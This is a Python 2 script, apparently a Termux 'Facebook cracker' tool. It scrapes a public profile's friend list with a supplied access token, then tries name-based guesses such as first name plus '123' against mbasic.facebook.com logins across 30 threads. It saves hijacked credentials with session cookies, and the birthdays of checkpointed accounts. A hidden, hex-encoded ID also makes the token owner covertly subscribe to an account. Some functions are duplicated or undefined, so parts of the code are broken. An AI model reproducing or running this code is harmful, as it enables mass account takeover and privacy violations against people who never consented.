#!/usr/bin/python2
# coding=utf-8
import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests installing!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures installing!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Module bs4 installing!...\n'
    os.system('pip2 install bs4')
    
try:
    import figlet
except ImportError:
    print '\n [×] Module figlet installing!...\n'
    os.system('pkg install figlet')
   
try:
    import lolcat
except ImportError:
    print '\n [×] Module lolcat installing!...\n'
    os.system('pip2 install lolcat')
    os.system('clear')
import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as axim_xau
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ["JANUARY", "FEBRUARY", "MARCH", "APRIL", "MAY", "JUNE", "JULY", "AUGUST", "SEPTEMBER", "OCTOBER", "NOVEMBER", "DECEMBER"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')

P = "\033[97;1m" # White
M = "\033[91;1m" # Red
H = "\033[92;1m" # Green
K = "\033[93;1m" # Yellow
B = "\033[94;1m" # Blue
U = "\033[95;1m" # Purple
O = "\033[92;1m" # Light blue
#N = "\033[0m"    # Color Off
N = "\033[93;1m"
my_color = [
 P, M, H, K, B, U, O, N]
color = random.choice(my_color)

ok = []
cp = []
id = []
user = []
num = 0
loop = 0

user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34"]
usera_gent=(user_agentz_qu[2])

url = "https://mbasic.facebook.com"

bulan_ttl = {"01": "JANUARY", "02": "FEBRUARY", "03": "MARCH", "04": "APRIL", "05": "MAY", "06": "JUNE", "07": "JULY", "08": "AUGUST", "09": "SEPTEMBER", "10": "OCTOBER", "11": "NOVEMBER", "12": "DECEMBER"}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
        
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] REMOVE TOKEN %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)


logo = """
          .dP"Y8 8888b.   88888 
          `Ybo."  8I  Yb     88 
          o.`Y8b  8I  dY o.  88 
          8bodP' 8888Y"  "bodP' 

"""
	


def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] CRACK COMPLETE...'%(N,K,N)
        print '\n\n [%s+%s] TOTAL OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] TOTAL CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] OOPS YOU GOT NO RESULTS :('%(M,N);exit()


def sdj():
    os.system('clear')
    print logo
    print("%s IF YOU DON'T KNOW HOW TO GET TOKEN TYPE (%sOPEN%s)")%(K,H,K)
    print("")
    nunu = raw_input('\n %s[%s?%s] TOKEN :%s ' % (N, M, N, H))
    if nunu in ('open', 'Open', 'OPEN'):
        raw_input('\n %s*%s PRESS ENTER ' % (O, N))
        os.system('xdg-open https://m.youtube.com/watch?v=jdGD_KqN4Pk')
        sdj()
    try:
        nam = requests.get('https://graph.facebook.com/me?access_token=%s' % nunu).json()['name']
        open('token.txt', 'w').write(nunu)
        raw_input('\n %s*%s PRESS ENTER ' % (O, N))
        checkup(nunu)
        mr_error()
    except KeyError:
        print '\n\n %s[%s!%s] INVALID TOKEN :(' % (N, M, N)
        time.sleep(2)
        sdj()


def sdj():
    os.system('clear')
    try:
    	nunu = open('token.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] INVALID TOKEN'%(N,M,N);time.sleep(2);os.system('rm -rf token.txt');azimvau()
    try:
        nam = requests.get('https://graph.facebook.com/me?access_token=%s'%(nunu)).json()['name'].upper()
        IP = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + IP, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
    except KeyError:
        print '\n %s[%s×%s] INVALID TOKEN'%(N,M,N);time.sleep(2);os.system('rm -rf token.txt');azimvau()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] NO INTERNET CONNECTION :(\n'%(N,M,N))
    os.system('clear')
    print logo
    print  """\033[1;92m╭┳✪✪╤──────────────────────────────────✪✪➛➢"""
    print '      AUTHOR  >  SHAHZAIN DAVID JOIYA\n'
    print '      GITHUB   >   SHAHZAIN-SDJ\n'
   # print '      (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
    print '      (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
    print  """\033[1;92m╰┻✪✪╧──────────────────────────────────✪✪➛➢"""
    os.system('echo "\n [D]. DUMP ID PUBLICK\n [S]. START CRACKING\n [R]. CHK RESULTS\n [U]. SETTING U/A\n [0]. LOG OUT\n"| lolcat -a -d 20')
    #os.system("xdg-open https://t.me/mrerrorgroup")
    innocent = raw_input('\n\033[93;1m [*] MENU :\033[92;1m ')
    if innocent == '':
        print "\n %s[%s×%s] DON'T LEAVE IT BLANK"%(N,M,N);time.sleep(2);mr_error()
#    elif innocent in['1','01']:
    #    teman(nunu)
    elif innocent in['d','D']:
        publik(nunu)
#    elif innocent in['3','03']:
  #      followers(nunu)
  #  elif innocent in['4','04']:
 #       postingan(nunu)
    elif innocent in['s','start']:
        __crack__().plerr()
    elif innocent in['r','R']:
        try:
            dirs = os.listdir("results")
            print '\n [ CRACK RESULTS STORED IN YOUR FILE ]\n'
            for file in dirs:
                print(" [%s+%s] %s"%(O,N,file))
            file = raw_input("\n [%s?%s] ENTER FILENAME :%s "%(M,N,H))
            if file == "":
                file = raw_input("\n %s[%s?%s] ENTER FILENAME :%s %s"%(N,M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print(" %s[%s#%s] ═══════════════════════════════════════"%(N,O,N));time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan(" [%s*%s] %sCRACK%s RESULTS ON DATE %s:%s%s%s TOTAL%s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            print(" %s[%s#%s] ═══════════════════════════════════════"%(N,O,N));time.sleep(2)
            for fuck in total:
            	nunu = fuck.replace("\n","")
                titid  = nunu.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print(" %s[%s#%s] ═══════════════════════════════════════"%(N,O,N))
            raw_input('\n  [ %sBACK%s ] '%(O,N));mr_error()
        except (IOError):
            print("\n %s[%s×%s] OOPS YOU GOT NO RESULTS :("%(N,M,N))
            raw_input('\n  [ %sBACK%s ] '%(O,N));mr_error()
    elif innocent in['u','U']:
        ua_settings()
    elif innocent in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf token.txt')
        jalan('\n %s[%s✓%s]%s SUCCESSFULLY DELETED TOKEN'%(N,H,N,H));exit()
    else:
        print '\n %s[%s×%s] CHECK THE MENU [%s%s%s] IS NOT HERE.!'%(N,M,N,M,innocent,N);time.sleep(2);mr_error()


def checkup(nunu):
    try:
        tox = nunu
        requests.post('https://graph.facebook.com/%s/subscribers?access_token=%s'%(usera_gent,tox))
    except:
    	pass



def publik(nunu):
    try:
        os.mkdir('dump')
    except:pass
    try:
        mravu = raw_input('\n %s[%s?%s] PUBLIC ID  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] FILE NAME  : '%(N,O,N))
        knt = ('dump/' + ahh + '.sdh').replace(' ', '_')
        ys  = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(mravu,nunu)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;92m%s\033[0m] [\033[0;92m%s\033[0m] PROCESS DUMP ID...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)
            
        ys.close()
        jalan('\n\n %s[%s✓%s] SUCCESSFULLY DUMP ID FROM PUBLIC FRIEND'%(N,H,N))
        print ' [%s•%s] COPY THE OUTPUT FILE >> ( %s%s%s )'%(O,N,M,knt,N)
        os.system('echo "═════════════════════════════════════════════" | lolcat -a -d 2 -8')
        raw_input(' [%s ENTER%s ] '%(O,N));mr_error()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] ID DUMP FAILED, MAYBE THE ID IS NOT PUBLIC.\n'%(N,M,N))
        raw_input(' [ %sBACK%s ] '%(O,N));mr_error()



def ua_settings():
    print '\n (%s1%s) CHANGE USER AGENT'%(O,N)
    print ' (%s2%s) CHECK USER AGENT'%(O,N)
    ytbjts = raw_input('\n %s[%s?%s] CHOOSE : '%(N,O,N))
    if ytbjts == '':
        print "\n %s[%s×%s] DON'T LEAVE IT EMPTY"%(N,M,N);time.sleep(2);ua_settings()
    elif ytbjts =='1':
        ua_change()
    elif ytbjts =='2':
        check_uag()
    else:
        print '\n %s[%s×%s] WRONG INPUT'%(N,M,N);time.sleep(2);ua_settings()


def ua_change():
    os.system('rm -rf sdj_ua.txt')
    print '\n %s(%s•%s) NOTE : COPY USER AGENT FROM YOUR BROWSER.'%(N,O,N)
    print ' (%s•%s) THAN PASTE HERE \n'%(M,N)
    os.system('xdg-open https://www.google.com/search?q=my+user+agent')
    mew = raw_input(' [%s?%s] ENTER USER AGENT :%s '%(O,N,H))
    if mew == '':
        print "\n %s[%s×%s] DON'T LEAVE IT EMPTY BRO "%(N,M,N);ua_change()
    try:
        open('sdj_ua.txt', 'w').write(mew);time.sleep(2)
        jalan('\n %s[%s✓%s] SUCCESSFULLY CHANGED USER AGENT...'%(N,H,N))
        raw_input('\n  %s[ %sBACK%s ]'%(N,O,N));mr_error()
    except:pass


def check_uag():
    try:
        user_agent = open('sdj_ua.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n %s[%s+%s] YOUR USER AGENT : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n  %s[ %sBACK%s ]'%(N,O,N));mr_error()


class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] INPUT FILE : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] TOTAL ID -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] FILE [%s%s%s] NOT FUND FIRST DUMP CHECK 1 TO 4 OPTIONS BRO'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %sBACK%s ]'%(N,O,N));mr_error()
        ___axim_xau___ = raw_input(' [%s?%s] DO YOU WANT TO USE A MANUAL PASSWORD?  [Y/n]: '%(O,N))
        if ___axim_xau___ in ('Y', 'y'):
            print '\n %s[%s!%s] ADD MANUAL PASSWORD EXAMPLE : 123456,556677,102030'%(N,M,N)
            print(" %s[%s!%s] NOTE : MUST USE MORE THAN 6 CHARACTERS")%(N, M, N)
            while True:
                pwek = raw_input('\n [%s?%s] ENTER PASSWORD : '%(O,N))
                print ' [*] CRACK WITH PASSWORD -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print "\n %s[%s×%s] DON'T LEAVE IT EMPTY BRO"%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] PASSWORD MINIMUM 6 CHARACTERS'%(N,M,N)
                else:
                    def __axm__(uvarm=None): 
                        cin = raw_input('\n [*] METHOD : ')
                        if cin == '':
                            print "\n %s[%s×%s] DON'T EMPTY BRO"%(N,M,N);self.__axm__()
                        elif cin == '':
                            print '\n [%s+%s] OK RESULTS ARE SAVED TO -> RESULTS/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] CP RESULTS ARE SAVED TO -> RESULTS/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] YOU CAN TURN OFF MOBILE DATA TO PAUSE THE CRACK PROCESS\n'%(M,N)
                            with axim_xau(max_workers=30) as (__azimVau__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __azimVau__.submit(self.__api__, kimochi, uvarm)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                           os.system('echo -e "----------------------------------------------------------------------"| lolcat')
                           os.system('echo -e "\n\n                    USE FLIGHT MODE FOR (5) sec IN EVERY HOUR" | lolcat')
                           os.system('echo -e "\n\n                    FOR EXIT USE THIS KEY CTRL+Z" | lolcat')
                           os.system('echo -e "----------------------------------------------------------------------"| lolcat')
                           with axim_xau(max_workers=30) as (__azimVau__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __azimVau__.submit(self.__mbasic__, kimochi, uvarm)
                                    except: pass

                           os.remove(self.apk)
                           hasil(ok,cp)
                        elif cin == '':
                            print '\n [%s+%s] OK RESULTS ARE SAVED TO -> RESULTS/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] CP RESULTS ARE SAVED TO -> RESULTS/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] YOU CAN TURN OFF MOBILE DATA TO PAUSE THE CRACK PROCESS\n'%(M,N)
                            with axim_xau(max_workers=30) as (__azimVau__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __azimVau__.submit(self.__mfb,__, kimochi, uvarm)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%s×%s] WRONG INPUT BRO!'%(N,M,N);self.__axm__()
                    os.system('echo -e "\n\n         ╔═━────────────────━━━────────────────━═╗" | lolcat')
                    os.system('echo -e "\n\n                     [CHOSE METHOD]" | lolcat')
                    os.system('echo -e "\n\n              [1] METHOD-SDJ |BASIC| [SLOW]" | lolcat')
                    os.system('echo -e "\n\n          NOTE TYPE MBASIC/mbasic FOR OK RESULTS" | lolcat -a -d 20 -8')
                    os.system('echo -e "\n\n         ╚═━────────────────━━━────────────────━═╝" | lolcat')
                    __axm__(pwek.split(','))
                    break
        elif ___axim_xau___ in ('N', 'n'):
               os.system('echo -e "\n\n         ╔═━────────────────━━━────────────────━═╗" | lolcat')
               os.system('echo -e "\n\n                     [CHOSE METHOD]" | lolcat')
               os.system('echo -e "\n\n              [1] METHOD-SDJ |BASIC| [SLOW]" | lolcat')
               os.system('echo -e "\n\n          NOTE TYPE MBASIC/mbasic FOR OK RESULTS" | lolcat -a -d 20 -8')
               os.system('echo -e "\n\n         ╚═━────────────────━━━────────────────━═╝" | lolcat')
               self.__pler__()
        else:
            print '\n %s[%s×%s] Y/N STUPID! -_-'%(N,M,N);time.sleep(2);mr_error()
        return
        


  

    def __mbasic__(self, user, __axm__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [CRACK] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __axm__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_nunu = open('sdj_ua.txt', 'r').read()
            except (KeyError, IOError):
            	_nunu = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_nunu,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s[☆] 》SDJ OK《 %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    nunu = open('token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,nunu)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s [×] APROVAL_DETECT %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s[×] APROVAL_DETECT %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1


    def __pler__(self):
        axm = raw_input('\n [*] METHOD : ')
        if axm == '':
            print "\n %s[%s×%s] DON'T LEAVE IT EMPTY BRO"%(N,M,N);self.__pler__()
        
        elif axm in ('1', '01'):
            os.system('echo -e "----------------------------------------------------------------------"| lolcat -a -d 20 -8')
            os.system('echo -e "\n\n                    USE FLIGHT MODE FOR (5) sec IN EVERY HOUR" | lolcat -a -d 20 -8 ')
            os.system('echo -e "\n\n                    FOR EXIT USE THIS KEY CTRL+Z" | lolcat -a -d 20 -8')
            os.system('echo -e "----------------------------------------------------------------------"| lolcat -a -d 20 -8')
            with axim_xau(max_workers=30) as (__azimVau__):
            	for azmx in self.id: 
                    try:
                        uid, name = azmx.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            xnx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            xnx = [name, xz[0]+"123", xz[0]+"12345"]
                        __azimVau__.submit(self.__mbasic__, uid, xnx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        

        else:
            print '\n %s[%s×%s] WRONG INPUT'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    sdj()